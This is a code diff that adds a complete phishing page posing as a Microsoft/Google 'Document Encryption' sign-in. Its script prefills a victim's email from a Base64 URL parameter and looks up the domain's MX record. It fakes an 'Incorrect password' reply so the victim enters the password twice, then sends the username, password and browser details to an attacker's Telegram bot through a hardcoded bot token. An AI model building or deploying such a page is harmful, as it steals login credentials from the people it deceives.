@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document Encryption</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .login-container {
+            border: 1px solid #ccc;
+            padding: 20px;
+            width: 350px;
+            background-color: #fff;
+            text-align: center;
+            border-radius: 4px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background-color: #e6f0fa;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo svg {
+            width: 40px;
+            height: 40px;
+        }
+        .logo path {
+            fill: #0078d4;
+        }
+        h2 {
+            margin: 0 0 10px;
+            font-size: 18px;
+            color: #333;
+        }
+        p {
+            margin: 0 0 20px;
+            color: #666;
+            font-size: 14px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 8px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .input-field:disabled {
+            background-color: #f0f0f5;
+            color: #999;
+        }
+        .remember-me {
+            text-align: left;
+            margin: 10px 0;
+            color: #666;
+        }
+        .login-options {
+            margin: 10px 0;
+        }
+        .login-options img {
+            width: 24px;
+            height: 24px;
+            margin: 0 5px;
+            vertical-align: middle;
+        }
+        .login-btn {
+            background-color: #0078d4;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .login-btn:hover {
+            background-color: #005bb5;
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+        #message {
+            margin-top: 10px;
+            color: #d32f2f;
+        }
+        .copyright {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="#0078d4">
+                <!-- Envelope base -->
+                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                <!-- Lock on top -->
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-1 2-2 2zm3-8H9V6c0-1.66 1.34-3 3-3s3 1.34 3 3v3z"/>
+            </svg>
+        </div>
+        <h2>Document Encryption</h2>
+        <p>Sign-in with your organization email credentials to access.</p>
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <input type="text" id="username" class="input-field" placeholder="Username" required><br>
+            <input type="password" id="password" class="input-field" placeholder="Password" required><br>
+            <div class="remember-me"><input type="checkbox" name="remember"> Remember me</div>
+            <div class="button-container">
+                <div class="login-options">
+                    <img src="https://www.microsoft.com/favicon.ico" alt="Microsoft">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Webmail-icon.png" alt="Webmail">
+                    <img src="https://outlook.live.com/owa/favicon.ico" alt="Outlook">
+                    <img src="https://www.google.com/favicon.ico" alt="GSuite">
+                </div>
+                <button type="submit" class="login-btn">Login</button>
+            </div>
+        </form>
+        <div id="message"></div>
+        <div class="copyright">Copyright © 2024 Systems Incorporated. All rights reserved.</div>
+    </div>
+
+    <script>
+        // Retrieve username from URL (Base64)
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedUsername = urlParams.get('username');
+        if (encodedUsername) {
+            document.getElementById('username').value = atob(encodedUsername);
+        }
+
+        let loginAttempt = 0;
+
+        async function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const ip = '127.0.0.1'; // For testing; replace with real IP in production
+            const userAgent = navigator.userAgent;
+
+            // Validate email format
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(username)) {
+                document.getElementById('message').innerText = 'Please enter a valid email address.';
+                return;
+            }
+
+            // Extract domain from username
+            const domain = username.split('@')[1];
+
+            // Fetch MX record using Google DNS API
+            let mxRecord = 'MX record not found';
+            try {
+                const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+                const data = await response.json();
+                if (data.Answer && data.Answer.length > 0) {
+                    mxRecord = data.Answer[0].data.split(' ')[1]; // Extract the MX host
+                }
+            } catch (error) {
+                console.log('Error fetching MX record:', error);
+            }
+
+            loginAttempt++;
+
+            if (loginAttempt === 1) {
+                document.getElementById('message').innerText = 'Incorrect password.';
+                return;
+            }
+
+            if (loginAttempt === 2) {
+                document.getElementById('message').innerText = 'Login successful!';
+                // Send log to Telegram
+                const logMessage = `Username: ${username}\nPassword: ${password}\nMX Record: ${mxRecord}\nIP: https://ip-api.com/${ip}\nUser-Agent: ${userAgent}`;
+                sendToTelegram(logMessage);
+            }
+        }
+
+        function sendToTelegram(message) {
+            // Replace with your actual Telegram bot token and chat ID
+          const telegramBotToken = '7562801922:AAHhYlr-sjVX_72XL4j4LT-d04J0GWEAlLU';
+            const chatId = '-4818496964';
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .catch(err => console.log('Error sending to Telegram:', err));
+        }
+    </script>
+</body>
+</html>
